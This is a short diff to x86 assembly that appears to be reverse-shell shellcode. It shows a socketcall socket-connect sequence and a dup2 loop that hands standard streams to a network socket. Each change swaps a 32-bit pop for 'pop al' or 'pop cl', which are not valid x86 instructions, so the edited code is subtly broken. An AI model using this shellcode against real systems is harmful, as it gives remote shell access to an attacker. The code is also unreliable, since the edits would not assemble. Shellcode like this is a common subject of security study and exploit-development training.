@@ -30,7 +30,7 @@ _start:
 	
 	; syscall 102 in eax
 	push byte 0x66
- 	pop eax
+ 	pop al
  	
 	; 1 in ebx for type of socketcall
 	xor ebx, ebx
@@ -58,7 +58,7 @@ _start:
 	; socket_connect
 	; mov socket syscall number in eax
 	push byte 0x66
-	pop eax
+	pop al
 
 	; increment ebx for AF_INET
 	inc ebx
@@ -102,7 +102,7 @@ _start:
 	
 	; Set 2 in ecx
 	push byte 0x2
-	pop ecx
+	pop cl
 	
 	; Dup2 loop instructions
 	dup_loop:
